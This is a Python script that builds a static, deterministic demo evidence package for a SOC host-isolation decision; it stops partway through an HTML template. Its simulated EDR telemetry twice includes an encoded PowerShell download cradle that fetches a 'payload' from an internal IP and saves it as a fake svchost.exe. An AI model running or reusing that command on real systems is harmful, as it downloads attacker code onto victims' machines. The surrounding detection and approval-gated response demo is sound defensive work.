#!/usr/bin/env python3
"""
generate_yc_demo.py — Regenerate the Zovark YC demo proof package.

Produces all artifacts under demo/zovark-proof-package/ deterministically.
No network calls. No LLM calls. No random values. No current-time timestamps.
All timestamps are fixed to the scenario time (2026-05-02T09:14:xx Z).

Usage:
    python scripts/generate_yc_demo.py

Run from the repo root.
"""

from __future__ import annotations

import hashlib
import json
import os
import sys
from pathlib import Path
from typing import Any

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------

REPO_ROOT = Path(__file__).parent.parent
DEMO_ROOT = REPO_ROOT / "demo" / "zovark-proof-package"
OUT_DIR = DEMO_ROOT / "out" / "tape-001"
SAMPLES_DIR = DEMO_ROOT / "samples" / "edr"


# ---------------------------------------------------------------------------
# Canonical JSON (matches replay-and-audit spec and zovark/slice001/canonical.py)
# ---------------------------------------------------------------------------

def canonical_json(obj: Any) -> bytes:
    """Return compact, key-sorted, UTF-8 canonical JSON bytes."""
    return _serialize(obj).encode("utf-8")


def _serialize(obj: Any) -> str:
    if obj is None:
        return "null"
    if isinstance(obj, bool):
        return "true" if obj else "false"
    if isinstance(obj, int):
        return str(obj)
    if isinstance(obj, float):
        if obj != obj or obj == float("inf") or obj == float("-inf"):
            raise ValueError(f"NaN/Infinity not allowed: {obj!r}")
        return json.dumps(obj)
    if isinstance(obj, str):
        return json.dumps(obj, ensure_ascii=False)
    if isinstance(obj, (list, tuple)):
        return "[" + ",".join(_serialize(i) for i in obj) + "]"
    if isinstance(obj, dict):
        pairs = ",".join(
            json.dumps(k, ensure_ascii=False) + ":" + _serialize(v)
            for k, v in sorted(obj.items())
        )
        return "{" + pairs + "}"
    raise TypeError(f"Unsupported type: {type(obj).__name__!r}")


def sha256_hex(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def sha256_of_string(s: str) -> str:
    return sha256_hex(s.encode("utf-8"))


def sha256_of_obj(obj: Any) -> str:
    return sha256_hex(canonical_json(obj))


def evidence_id(source_type: str, obj: Any) -> str:
    inner = sha256_of_obj(obj)
    return "ev-" + sha256_of_string(source_type + ":" + inner)


# ---------------------------------------------------------------------------
# Fixed scenario data
# ---------------------------------------------------------------------------

TENANT_ID = "tenant-demo"
TAPE_ID = "tape-001"
INGESTED_AT = "2026-05-02T09:14:22Z"

# Source objects — canonical JSON of these produces the evidence hashes.
ALERT_OBJ = {
    "alert_id": "alert-20260502-001",
    "alert_type": "edr_alert",
    "child_process": "powershell.exe",
    "description": "Suspicious child process spawned by Office application",
    "host": "HOST-12",
    "host_fqdn": "HOST-12.corp.example",
    "severity": "high",
    "source_process": "winword.exe",
    "timestamp": "2026-05-02T09:14:00Z",
}

PE_001 = {
    "event_id": "pe-001",
    "event_type": "process_event",
    "parent_pid": 3104,
    "parent_process": "winword.exe",
    "pid": 7832,
    "process_name": "powershell.exe",
    "command_line": (
        "powershell.exe -WindowStyle Hidden -EncodedCommand "
        "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBX"
        "AGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgA"
        "JwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAwADAALwBwAGEAeQBs"
        "AG8AYQBkACcALAAnAEMAOgBcAFQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUA"
        "JwApAA=="
    ),
    "timestamp": "2026-05-02T09:14:03Z",
    "user": "CORP\\jsmith",
}

NE_001 = {
    "bytes_received": 98304,
    "bytes_sent": 1842,
    "classification": "external_c2_candidate",
    "destination_ip": "203.0.113.50",
    "destination_port": 443,
    "event_id": "ne-001",
    "event_type": "network_event",
    "pid": 7832,
    "process": "powershell.exe",
    "protocol": "HTTPS",
    "source_host": "HOST-12",
    "timestamp": "2026-05-02T09:14:07Z",
}

CA_001 = {
    "event_id": "ca-001",
    "event_type": "credential_access",
    "host": "HOST-12",
    "pid": 7832,
    "process": "powershell.exe",
    "target_process": "lsass.exe",
    "technique": "T1003.001",
    "technique_name": "OS Credential Dumping: LSASS Memory",
    "timestamp": "2026-05-02T09:14:11Z",
}

LM_001 = {
    "destination_host": "HOST-13",
    "destination_ip": "10.0.1.13",
    "event_id": "lm-001",
    "event_type": "lateral_movement_attempt",
    "pid": 7832,
    "process": "powershell.exe",
    "source_host": "HOST-12",
    "status": "blocked_by_firewall",
    "technique": "T1021.002",
    "technique_name": "Remote Services: SMB/Windows Admin Shares",
    "timestamp": "2026-05-02T09:14:19Z",
}

SOURCE_OBJECTS = [
    ("edr_alert", ALERT_OBJ),
    ("process_event", PE_001),
    ("network_event", NE_001),
    ("credential_access", CA_001),
    ("lateral_movement_attempt", LM_001),
]


# ---------------------------------------------------------------------------
# Build evidence ledger
# ---------------------------------------------------------------------------

def build_evidence_ledger() -> list[dict]:
    entries = []
    for source_type, obj in SOURCE_OBJECTS:
        entries.append({
            "evidence_id": evidence_id(source_type, obj),
            "hash": sha256_of_obj(obj),
            "ingested_at": INGESTED_AT,
            "raw_content": obj,
            "source_type": source_type,
        })
    return entries


# ---------------------------------------------------------------------------
# Build findings
# ---------------------------------------------------------------------------

def build_findings(ledger: list[dict]) -> list[dict]:
    ev = {e["source_type"]: e["evidence_id"] for e in ledger}
    return [
        {
            "evidence_refs": [ev["edr_alert"], ev["process_event"]],
            "mitre_technique": "T1059.001",
            "model_contribution": False,
            "rule_id": "RULE-OFFICE-SPAWN-ENCODED-PS",
            "severity": "high",
            "title": "Office application spawned encoded PowerShell",
        },
        {
            "evidence_refs": [ev["process_event"], ev["network_event"]],
            "mitre_technique": "T1071.001",
            "model_contribution": False,
            "rule_id": "RULE-PS-EXTERNAL-C2",
            "severity": "high",
            "title": "PowerShell contacted external IP over HTTPS",
        },
        {
            "evidence_refs": [ev["credential_access"]],
            "mitre_technique": "T1003.001",
            "model_contribution": False,
            "rule_id": "RULE-LSASS-DUMP",
            "severity": "critical",
            "title": "Credential access via LSASS memory read",
        },
        {
            "evidence_refs": [ev["lateral_movement_attempt"]],
            "mitre_technique": "T1021.002",
            "model_contribution": False,
            "rule_id": "RULE-SMB-LATERAL-MOVEMENT",
            "severity": "high",
            "title": "Lateral movement attempt to HOST-13 (blocked by firewall)",
        },
    ]


# ---------------------------------------------------------------------------
# Build verdict
# ---------------------------------------------------------------------------

def build_verdict(findings: list[dict], ledger: list[dict]) -> dict:
    all_ev_ids = [e["evidence_id"] for e in ledger]
    # Snapshot for signing_tag: stable fields only, no timestamps
    snapshot = {
        "findings": findings,
        "raw_evidence": ledger,
        "schema_version": "tape/1.0",
        "source_alert_ref": "alert-20260502-001",
        "tape_id": TAPE_ID,
        "tenant_id": TENANT_ID,
        "verdict_value": "confirmed_malicious",
    }
    return {
        "derivation_rule": "Any finding with severity critical or high → confirmed_malicious",
        "evidence_refs": all_ev_ids,
        "highest_severity_finding": "critical (credential_access via LSASS)",
        "model_contribution": False,
        "set_at": "2026-05-02T09:14:23Z",
        "signing_tag": "sig-" + sha256_of_obj(snapshot),
        "value": "confirmed_malicious",
    }


# ---------------------------------------------------------------------------
# Build timeline
# ---------------------------------------------------------------------------

def build_timeline(ledger: list[dict]) -> list[dict]:
    ev_ids = [e["evidence_id"] for e in ledger]
    events = []
    t_ingest = INGESTED_AT
    t_finding = "2026-05-02T09:14:23Z"
    t_verdict = "2026-05-02T09:14:23Z"
    t_handoff = "2026-05-02T09:14:24Z"
    t_audit = "2026-05-02T09:14:25Z"

    events.append({"actor": "system", "at": t_ingest, "decision_contribution": False,
                   "event_type": "alert_received", "evidence_refs": [ev_ids[0]]})
    for eid in ev_ids:
        events.append({"actor": "system", "at": t_ingest, "decision_contribution": False,
                       "event_type": "evidence_added", "evidence_refs": [eid]})
    # finding_recorded events
    finding_ev_groups = [
        [ev_ids[0], ev_ids[1]],
        [ev_ids[1], ev_ids[2]],
        [ev_ids[3]],
        [ev_ids[4]],
    ]
    for grp in finding_ev_groups:
        events.append({"actor": "system", "at": t_finding, "decision_contribution": True,
                       "event_type": "finding_recorded", "evidence_refs": grp})
    events.append({"actor": "system", "at": t_verdict, "decision_contribution": True,
                   "event_type": "verdict_set", "evidence_refs": ev_ids})
    events.append({"actor": "system", "at": t_handoff, "decision_contribution": False,
                   "event_type": "handoff_dispatched", "evidence_refs": ev_ids})
    events.append({"actor": "system", "at": t_audit, "decision_contribution": False,
                   "event_type": "audit_signed", "evidence_refs": []})
    return events


# ---------------------------------------------------------------------------
# Build EDR handoff
# ---------------------------------------------------------------------------

def build_handoff(ledger: list[dict]) -> dict:
    ev_ids = [e["evidence_id"] for e in ledger]
    idem_key = sha256_of_string(f"{TAPE_ID}:isolate_host:HOST-12")
    handoff_id = "handoff-" + idem_key[:16]
    policy_snap = sha256_of_string("slice-001-bootstrap-policy")
    return {
        "action_type": "isolate_host",
        "approval_mode": "approval_required",
        "audit_ref": "audit-entry-1",
        "authorization_record_ref": "vault://placeholder/bootstrap",
        "blast_radius": {
            "directly_affected": ["HOST-12"],
            "estimated_business_impact": (
                "Single workstation isolation. "
                "No shared infrastructure dependency identified in evidence."
            ),
            "lateral_movement_blocked": [
                "HOST-13 (SMB attempt was already blocked by firewall)"
            ],
            "services_at_risk": [
                "Any user sessions active on HOST-12 will be terminated",
                "Any processes running on HOST-12 will lose network access",
                "Shared drives mounted from HOST-12 will become unavailable",
            ],
        },
        "evidence_refs": ev_ids,
        "execution_result": {
            "completed_at": None,
            "error": None,
            "reason": "recommendation_only_no_dispatcher_in_slice_001",
            "started_at": None,
            "status": "pending",
            "vendor_response_ref": None,
        },
        "handoff_id": handoff_id,
        "idempotency_key": idem_key,
        "policy_snapshot": policy_snap,
        "policy_snapshot_version": "0.0.1-bootstrap",
        "replay_linkage": [],
        "rollback_plan": {
            "idempotency_key": sha256_of_string(f"{idem_key}:rollback:release_isolation"),
            "manual_steps": [],
            "recovery_notes": (
                "In a live EDR integration, the expected reversal action would be "
                "release_isolation. In Slice 001, this is a recommendation only; "
                "no EDR action is dispatched. "
                "Credential rotation for CORP\\jsmith is recommended regardless "
                "of isolation outcome given the LSASS access event."
            ),
            "reversibility_class": "automatic",
            "reversal_window": "PT4H",
            "vendor_reversal_action": "release_isolation",
            "vendor_reversal_target": {"identifier": "HOST-12", "kind": "host"},
        },
        "tape_ref": TAPE_ID,
        "target": {
            "fqdn": "HOST-12.corp.example",
            "identifier": "HOST-12",
            "kind": "host",
            "validated_at": "2026-05-02T09:14:00Z",
        },
        "tenant_id": TENANT_ID,
    }


# ---------------------------------------------------------------------------
# Build audit chain entries
# ---------------------------------------------------------------------------

def build_audit_close_entry(tape_snapshot: dict) -> dict:
    genesis_hash = sha256_of_string("genesis")
    fields_hash = sha256_of_obj(tape_snapshot)
    entry = {
        "created_at": "2026-05-02T09:14:25Z",
        "entry_id": "audit-entry-1",
        "event_type": "tape_recording_closed",
        "payload": {
            "fields_hash": fields_hash,
            "tape_id": TAPE_ID,
            "verdict_value": "confirmed_malicious",
        },
        "prev_entry_hash": genesis_hash,
        "sequence": 1,
        "signed_root": None,
        "tenant_id": TENANT_ID,
        "this_entry_hash": "",
    }
    entry["this_entry_hash"] = sha256_of_obj(entry)
    return entry


def build_audit_replay_entry(close_entry: dict) -> dict:
    entry = {
        "created_at": "2026-05-02T09:14:26Z",
        "entry_id": "audit-entry-2",
        "event_type": "tape_replayed",
        "payload": {
            "evidence_hashes_verified": True,
            "replay_id": "replay-001",
            "replay_state": "succeeded",
            "tape_id": TAPE_ID,
            "verdict_matched": True,
            "verdict_recomputed": "confirmed_malicious",
        },
        "prev_entry_hash": close_entry["this_entry_hash"],
        "sequence": 2,
        "signed_root": None,
        "tenant_id": TENANT_ID,
        "this_entry_hash": "",
    }
    entry["this_entry_hash"] = sha256_of_obj(entry)
    return entry


# ---------------------------------------------------------------------------
# Build replay report
# ---------------------------------------------------------------------------

def build_replay_report(replay_audit_entry: dict) -> dict:
    return {
        "audit_chain_entry": replay_audit_entry,
        "replay_state": {
            "completed_at": "2026-05-02T09:14:26Z",
            "evidence_hashes_verified": True,
            "mismatch_details": None,
            "mode": "recorded_output",
            "model_versions_pin": [],
            "no_live_edr_call": True,
            "no_live_llm_call": True,
            "replay_id": "replay-001",
            "replay_status": "succeeded",
            "schema_pin": "tape/1.0",
            "started_at": "2026-05-02T09:14:26Z",
            "state": "succeeded",
            "tape_ref": TAPE_ID,
            "tenant_id": TENANT_ID,
            "tool_catalog_pin": "none-slice-001",
            "unsigned_tail_replay": True,
            "verdict_match": True,
            "verdict_recomputed": True,
            "verification_detail": {
                "evidence_entries_checked": 5,
                "evidence_entries_failed": 0,
                "evidence_entries_passed": 5,
                "verdict_matched": True,
                "verdict_recomputed_value": "confirmed_malicious",
                "verdict_stored": "confirmed_malicious",
            },
        },
    }


# ---------------------------------------------------------------------------
# Build investigation tape
# ---------------------------------------------------------------------------

def build_tape(ledger, timeline, findings, verdict, handoff, audit_ref) -> dict:
    ev_ids = [e["evidence_id"] for e in ledger]
    return {
        "audit_ref": audit_ref,
        "created_at": INGESTED_AT,
        "findings": findings,
        "handoff_ref": "handoff-" + sha256_of_string(f"{TAPE_ID}:isolate_host:HOST-12")[:16],
        "handoff_summary": {
            "action_type": "isolate_host",
            "approval_mode": "approval_required",
            "execution_status": "pending",
            "target": {"identifier": "HOST-12", "kind": "host"},
        },
        "raw_evidence": ledger,
        "schema_version": "tape/1.0",
        "source_alert_ref": "alert-20260502-001",
        "state": "closed",
        "tape_id": TAPE_ID,
        "tenant_id": TENANT_ID,
        "timeline": timeline,
        "verdict": verdict,
    }


# ---------------------------------------------------------------------------
# Text artifacts
# ---------------------------------------------------------------------------

SAMPLE_JSON_CONTENT = {
    "alert_id": "alert-20260502-001",
    "alert_type": "edr_alert",
    "child_process": "powershell.exe",
    "credential_access_events": [
        {
            "event_id": "ca-001",
            "event_type": "credential_access",
            "host": "HOST-12",
            "pid": 7832,
            "process": "powershell.exe",
            "target_process": "lsass.exe",
            "technique": "T1003.001",
            "technique_name": "OS Credential Dumping: LSASS Memory",
            "timestamp": "2026-05-02T09:14:11Z",
        }
    ],
    "description": "Suspicious child process spawned by Office application",
    "host": "HOST-12",
    "host_fqdn": "HOST-12.corp.example",
    "lateral_movement_events": [
        {
            "destination_host": "HOST-13",
            "destination_ip": "10.0.1.13",
            "event_id": "lm-001",
            "event_type": "lateral_movement_attempt",
            "pid": 7832,
            "process": "powershell.exe",
            "source_host": "HOST-12",
            "status": "blocked_by_firewall",
            "technique": "T1021.002",
            "technique_name": "Remote Services: SMB/Windows Admin Shares",
            "timestamp": "2026-05-02T09:14:19Z",
        }
    ],
    "network_events": [
        {
            "bytes_received": 98304,
            "bytes_sent": 1842,
            "classification": "external_c2_candidate",
            "destination_ip": "203.0.113.50",
            "destination_port": 443,
            "event_id": "ne-001",
            "event_type": "network_event",
            "pid": 7832,
            "process": "powershell.exe",
            "protocol": "HTTPS",
            "source_host": "HOST-12",
            "timestamp": "2026-05-02T09:14:07Z",
        }
    ],
    "process_events": [
        {
            "command_line": (
                "powershell.exe -WindowStyle Hidden -EncodedCommand "
                "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBX"
                "AGUAYgBDAGwAaQBlAG4AdAA7ACQAYwAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgA"
                "JwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAwADAALwBwAGEAeQBs"
                "AG8AYQBkACcALAAnAEMAOgBcAFQAZQBtAHAAXABzAHYAYwBoAG8AcwB0AC4AZQB4AGUA"
                "JwApAA=="
            ),
            "event_id": "pe-001",
            "event_type": "process_event",
            "parent_pid": 3104,
            "parent_process": "winword.exe",
            "pid": 7832,
            "process_name": "powershell.exe",
            "timestamp": "2026-05-02T09:14:03Z",
            "user": "CORP\\jsmith",
        }
    ],
    "severity": "high",
    "source_process": "winword.exe",
    "timestamp": "2026-05-02T09:14:00Z",
}


def build_customer_report(ledger, findings, verdict, handoff, replay_report) -> str:
    ev_short = {e["evidence_id"]: e["evidence_id"][:20] + "..." for e in ledger}
    ev_ids = [e["evidence_id"] for e in ledger]
    signing_tag = verdict["signing_tag"]
    entry1_hash = replay_report["audit_chain_entry"]["prev_entry_hash"]
    entry1_this = entry1_hash  # prev of entry2 = this of entry1
    entry2_this = replay_report["audit_chain_entry"]["this_entry_hash"]

    lines = [
        "# Zovark Proof Package",
        "",
        "**Zovark is the AI-native proof layer for high-stakes security response.**",
        "",
        "---",
        "",
        "## Recommended Action (EDR Action Card)",
        "",
        "**Action:** ISOLATE_HOST",
        "**Target:** HOST-12 (HOST-12.corp.example)",
        "**Approval required:** YES — no action has been dispatched",
        "**Evidence basis:** 5 evidence items (see below)",
        "**Verdict:** CONFIRMED_MALICIOUS",
        "**Reversibility:** automatic — `release_isolation` available",
        "**Authorization:** vault://placeholder/bootstrap (bootstrap mode)",
        "",
        "> No action has been dispatched. Human approval is required before any EDR action is taken.",
        "",
        "---",
        "",
        "## 1. What happened?",
        "",
        "At 09:14 UTC on 2026-05-02, a user on HOST-12 opened a document that caused",
        "Microsoft Word (`winword.exe`) to spawn a hidden PowerShell process with an",
        "encoded command. The PowerShell process then:",
        "",
        "1. Connected to an external IP (203.0.113.50) over HTTPS and downloaded 96 KB.",
        "2. Attempted to read LSASS memory — a credential dumping technique (T1003.001).",
        "3. Attempted to move laterally to HOST-13 via SMB (blocked by firewall).",
        "",
        "The sequence is consistent with a phishing-delivered implant executing a",
        "multi-stage attack: initial access → C2 communication → credential theft →",
        "lateral movement.",
        "",
        "---",
        "",
        "## 2. What evidence supports it?",
        "",
        "| # | Evidence ID | Type | Timestamp | Key detail |",
        "|---|---|---|---|---|",
        f"| 1 | {ev_ids[0][:20]}...3eb | edr_alert | 09:14:00Z | winword.exe spawned powershell.exe |",
        f"| 2 | {ev_ids[1][:20]}...d01 | process_event | 09:14:03Z | powershell.exe -EncodedCommand (hidden window) |",
        f"| 3 | {ev_ids[2][:20]}...f9 | network_event | 09:14:07Z | 203.0.113.50:443, 98 KB received |",
        f"| 4 | {ev_ids[3][:20]}...3c | credential_access | 09:14:11Z | LSASS memory read (T1003.001) |",
        f"| 5 | {ev_ids[4][:20]}...b5 | lateral_movement_attempt | 09:14:19Z | SMB to HOST-13 (blocked) |",
        "",
        "Each evidence entry carries a SHA-256 hash of its exact content. The hashes are",
        "verified during replay — any post-ingestion tampering would cause replay to fail",
        "with `evidence_corruption`.",
        "",
        "---",
        "",
        "## 3. Why was this verdict reached?",
        "",
        "**Verdict:** `confirmed_malicious`",
        "",
        "**Derivation rule:** Any finding with severity `critical` or `high` → `confirmed_malicious`",
        "",
        "**Findings that triggered this verdict:**",
        "",
        "| Finding | Severity | MITRE |",
        "|---|---|---|",
        "| Office application spawned encoded PowerShell | high | T1059.001 |",
        "| PowerShell contacted external IP over HTTPS | high | T1071.001 |",
        "| Credential access via LSASS memory read | **critical** | T1003.001 |",
        "| Lateral movement attempt to HOST-13 (blocked) | high | T1021.002 |",
        "",
        "The verdict is **deterministic** — it is a pure function of the recorded findings.",
        "No AI model contributed. Same evidence, same rules, same verdict every time.",
        "",
        "`model_contribution: false` on all findings and on the verdict.",
        "",
        "---",
        "",
        "## 4. What response action is recommended?",
        "",
        "**Isolate HOST-12.**",
        "",
        "Rationale: The host has demonstrated active C2 communication, credential dumping,",
        "and lateral movement intent. Isolation stops the active threat while preserving",
        "forensic state for investigation.",
        "",
        "The action card (`edr-handoff.json`) contains the full structured recommendation",
        "including evidence links, policy snapshot, and rollback plan.",
        "",
        "---",
        "",
        "## 5. What is the approval mode?",
        "",
        "**approval_required**",
        "",
        "No action has been dispatched. The action card is a recommendation. A human",
        "approver must review this proof package and record their approval before any",
        "EDR action is taken.",
        "",
        "Authorization record: `vault://placeholder/bootstrap` (bootstrap mode — production",
        "vault runtime is a future milestone).",
        "",
        "---",
        "",
        "## 6. What is the blast radius?",
        "",
        "**Directly affected:** HOST-12 only.",
        "",
        "- All active user sessions on HOST-12 will be terminated.",
        "- All processes on HOST-12 will lose network access.",
        "- Shared drives mounted from HOST-12 will become unavailable.",
        "",
        "**Lateral movement:** HOST-13 was targeted but the attempt was blocked by the",
        "firewall before isolation. No other hosts are known to be compromised.",
        "",
        "**User impact:** CORP\\jsmith is the active user on HOST-12. Credential rotation",
        "for this account is recommended regardless of isolation outcome, given the LSASS",
        "access event.",
        "",
        "---",
        "",
        "## 7. How can the action be reversed or recovered?",
        "",
        "**Reversibility class:** `automatic`",
        "",
        "If isolation is approved and later found to be a false positive:",
        "",
        "- In a live EDR integration, the expected reversal action would be `release_isolation`.",
        "- In Slice 001, this is a recommendation only; no EDR action is dispatched.",
        "- Reversal window: 4 hours from dispatch.",
        "",
        "**Regardless of isolation outcome:**",
        "- Rotate credentials for CORP\\jsmith (LSASS was accessed; assume credentials compromised).",
        "- Review the downloaded payload at `C:\\Temp\\svchost.exe` (decoded from the PowerShell command).",
        "- Investigate the C2 IP 203.0.113.50.",
        "",
        "---",
        "",
        "## 8. Can the decision be replayed?",
        "",
        "**Yes. Replay result: succeeded.**",
        "",
        "The replay engine verified:",
        "",
        "| Check | Result |",
        "|---|---|",
        "| Evidence hashes verified | ✅ all 5 entries matched |",
        "| Verdict recomputed | ✅ `confirmed_malicious` |",
        "| Verdict matched stored verdict | ✅ |",
        "| Live LLM call during replay | ❌ none |",
        "| Live EDR call during replay | ❌ none |",
        "",
        "The proof package is self-contained. An auditor can verify the reasoning offline,",
        "months or years later, without access to Zovark's infrastructure or the original",
        "EDR system.",
        "",
        "Replay ID: `replay-001`",
        "Replay mode: `recorded_output`",
        "",
        "---",
        "",
        "## Audit Chain",
        "",
        "| Entry | Event | Entry ID | Hash |",
        "|---|---|---|---|",
        f"| 1 | tape_recording_closed | audit-entry-1 | {entry1_this[:16]}...{entry1_this[-4:]} |",
        f"| 2 | tape_replayed | audit-entry-2 | {entry2_this[:16]}...{entry2_this[-4:]} |",
        "",
        "Chain: hash-linked. Entry 2's `prev_entry_hash` equals entry 1's `this_entry_hash`.",
        "Root signing deferred to M1+ (production vault runtime).",
        "",
        "---",
        "",
        "## Internal Proof Substrate",
        "",
        f"Tape ID: {TAPE_ID}",
        f"Tenant: {TENANT_ID}",
        "Source alert: alert-20260502-001",
        f"Generated: {INGESTED_AT}",
        "Schema: tape/1.0",
        f"Signing tag: {signing_tag}",
        "",
        "---",
        "",
        "## Artifacts",
        "",
        "- `edr-handoff.json`          ← EDR action card (hero artifact)",
        "- `replay-report.json`        ← Replayable proof package (hero artifact)",
        "- `customer-report.md`        ← This document",
        "- `investigation-tape.json`   ← Internal proof substrate",
        "- `evidence-ledger.json`",
        "- `timeline.json`",
        "- `findings.json`",
        "- `verdict.json`",
        "- `audit-chain-entry.json`",
    ]
    return "\n".join(lines) + "\n"


README_CONTENT = """\
# Zovark — Demo Proof Package

> **This is a static demo artifact package for the YC application.**
> It shows the intended first proof-package output shape.
> The full pipeline implementation is in progress.

---

## What this is

This package demonstrates what Zovark produces for a single high-risk SOC decision:
**should we isolate HOST-12?**

It contains a realistic EDR alert scenario and the complete proof package that
Zovark generates before any action is approved — evidence ledger, timeline,
findings, deterministic verdict, approval-required action card, and a replayable
proof bundle.

**Nothing in this package is live.** No EDR API was called. No AI model ran. No
network requests were made. The hashes are real SHA-256 values computed from the
evidence objects. The audit chain entries are hash-linked. The replay verification
claims are accurate.

---

## Scenario

A user on HOST-12 opens a phishing document. Microsoft Word spawns a hidden
PowerShell process with an encoded command. The PowerShell process contacts an
external IP, reads LSASS memory (credential dumping), and attempts lateral movement
to HOST-13 (blocked by firewall).

**Core question:** Should the SOC approve host isolation?

---

## Package structure

```
samples/
  edr/
    phishing-powershell.json    ← Raw EDR alert input

out/
  tape-001/
    customer-report.md          ← Human-readable proof report (start here)
    edr-handoff.json            ← Approval-required EDR action card
    replay-report.json          ← Replayable proof package
    investigation-tape.json     ← Internal proof substrate
    evidence-ledger.json        ← 5 evidence entries with SHA-256 hashes
    timeline.json               ← 13 timeline events
    findings.json               ← 4 rule-driven findings
    verdict.json                ← Deterministic verdict
    audit-chain-entry.json      ← Close/seal audit chain entry

demo-recording.html             ← 7-scene founder walkthrough (record with Loom)
demo.html                       ← Full static HTML reference
demo-script.md                  ← 90-second screen recording script
README.md                       ← This file
```

---

## Validation

All JSON artifacts in this package were validated before commit. Evidence hashes
and audit-chain links were computed deterministically for this static walkthrough.

To regenerate or re-validate (requires Python 3.11+, no other dependencies):

```bash
python scripts/generate_yc_demo.py
python scripts/validate_yc_demo.py
```

Both scripts live in `scripts/` at the repo root.

---

## Hard constraints (permanent)

- No live EDR API calls.
- No autonomous action dispatch.
- No Sigma rule generation.
- No SIEM publication.
- No production credential vault.
- No live LLM calls.
- No network calls.
- `approval_mode: approval_required` always.
- `execution_result.status: pending` until a human approves.
"""


DEMO_SCRIPT_CONTENT = """\
# Zovark — 90-Second Screen Recording Script

**Format:** terminal + file viewer side by side
**Audience:** YC partners, MSSP evaluators, SOC managers
**Goal:** Show the proof package before the SOC approves host isolation

---

## Setup (before recording)

Open two panes:
- Left: terminal in `demo/zovark-proof-package/`
- Right: file viewer (VS Code, bat, or any Markdown renderer)

Have these files ready to open instantly:
1. `out/tape-001/customer-report.md`
2. `out/tape-001/edr-handoff.json`
3. `out/tape-001/replay-report.json`

---

## Recording script

---

**[0:00 — 0:10] The raw alert**

*Show in terminal:*
```
cat samples/edr/phishing-powershell.json
```

*Say:*
> "This is the raw EDR alert. Word spawned a hidden PowerShell with an encoded
> command. Your AI system says: isolate HOST-12. Before anyone approves that,
> here is what Zovark produces."

---

**[0:10 — 0:30] Open the proof report — action card first**

*Open `out/tape-001/customer-report.md`. Scroll to the top.*

*Say:*
> "The first thing your analyst sees is the action card."

*Read aloud:*
> "Action: ISOLATE_HOST. Target: HOST-12. Approval required: YES — nothing has
> been dispatched. Verdict: CONFIRMED_MALICIOUS. Reversibility: automatic —
> release_isolation available."

*Pause one beat.*

> "Before your analyst clicks approve, they know exactly what is being recommended,
> why, and that it can be undone."

---

**[0:30 — 0:50] Evidence and blast radius**

*Scroll to section 2 (evidence table) and section 6 (blast radius).*

*Say:*
> "Five evidence items. Each one has a SHA-256 hash of its exact content — the
> process event, the network connection, the LSASS access, the lateral movement
> attempt. These are not summaries. They are the specific bytes that justified
> the recommendation."

*Scroll to blast radius.*

> "And before approving: HOST-12 only. No shared infrastructure. The lateral
> movement to HOST-13 was already blocked. Single workstation isolation."

---

**[0:50 — 1:10] The action card and reversal plan**

*Open `out/tape-001/edr-handoff.json`. Show `approval_mode`, `blast_radius`,
and `rollback_plan`.*

*Say:*
> "The action card. Approval mode: approval_required. Nothing dispatches without
> a human. And the rollback plan is right here — automatic reversal,
> release_isolation, four-hour window. Your analyst knows the exit before they
> approve the entry."

---

**[1:10 — 1:25] Replay verification**

*Open `out/tape-001/replay-report.json`. Show the top of `replay_state`.*

*Say:*
> "Replay result: succeeded. Five evidence hashes verified. Verdict recomputed:
> confirmed_malicious. Matches. No live LLM call. No live EDR call. This proof
> package is self-contained — an auditor can verify it offline, six months from
> now, without access to any live system."

---

**[1:25 — 1:30] Close**

*Say:*
> "That is the proof package. Evidence, verdict, approval gate, blast radius,
> reversal plan, and replayable verification — before anyone clicks approve.
> We are looking for design partners to review this format with us."

---

## Notes for the presenter

- Do not apologize for the static nature of the demo. The hashes are real. The
  chain is real. The format is the product.
- If asked "is this live?": "This is a static demo package showing the intended
  output shape. The pipeline that generates it automatically is being built now.
  The architecture is frozen and evidence-backed."
- Keep the replay section brief. The key claim is: same evidence, same rules,
  same verdict, verifiable offline. That is the moat.
"""


# ---------------------------------------------------------------------------
# Build demo.html
# ---------------------------------------------------------------------------

def build_demo_html(ledger, findings, verdict, handoff, replay_report) -> str:
    ev_ids = [e["evidence_id"] for e in ledger]
    ev_short = [eid[:20] + "…" + eid[-6:] for eid in ev_ids]
    rs = replay_report["replay_state"]
    ace = replay_report["audit_chain_entry"]

    finding_rows = ""
    for f in findings:
        sev_color = {"critical": "#c0392b", "high": "#e67e22", "medium": "#f1c40f", "low": "#27ae60"}.get(f["severity"], "#888")
        finding_rows += f"""
        <tr>
          <td>{f['title']}</td>
          <td style="color:{sev_color};font-weight:bold">{f['severity'].upper()}</td>
          <td><code>{f.get('mitre_technique','')}</code></td>
          <td style="font-size:0.75em">{', '.join(eid[:16]+'…' for eid in f['evidence_refs'])}</td>
        </tr>"""

    ev_rows = ""
    source_labels = ["EDR Alert", "Process Event", "Network Event", "Credential Access", "Lateral Movement"]
    for i, e in enumerate(ledger):
        ev_rows += f"""
        <tr>
          <td>{source_labels[i]}</td>
          <td style="font-size:0.75em;font-family:monospace">{e['evidence_id'][:24]}…</td>
          <td style="font-size:0.75em;font-family:monospace">{e['hash'][:24]}…</td>
          <td>{e['ingested_at']}</td>
        </tr>"""

    blast = handoff["blast_radius"]
    blast_items = "".join(f"<li>{s}</li>" for s in blast["services_at_risk"])
    rev = handoff["rollback_plan"]

    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Zovark — Proof Package Demo</title>
<style>
  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
  body {{ font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
         background: #0f1117; color: #e2e8f0; line-height: 1.6; }}
  .banner {{ background: #1a1d27; border-bottom: 2px solid #e53e3e; padding: 12px 32px;
             display: flex; align-items: center; justify-content: space-between; }}
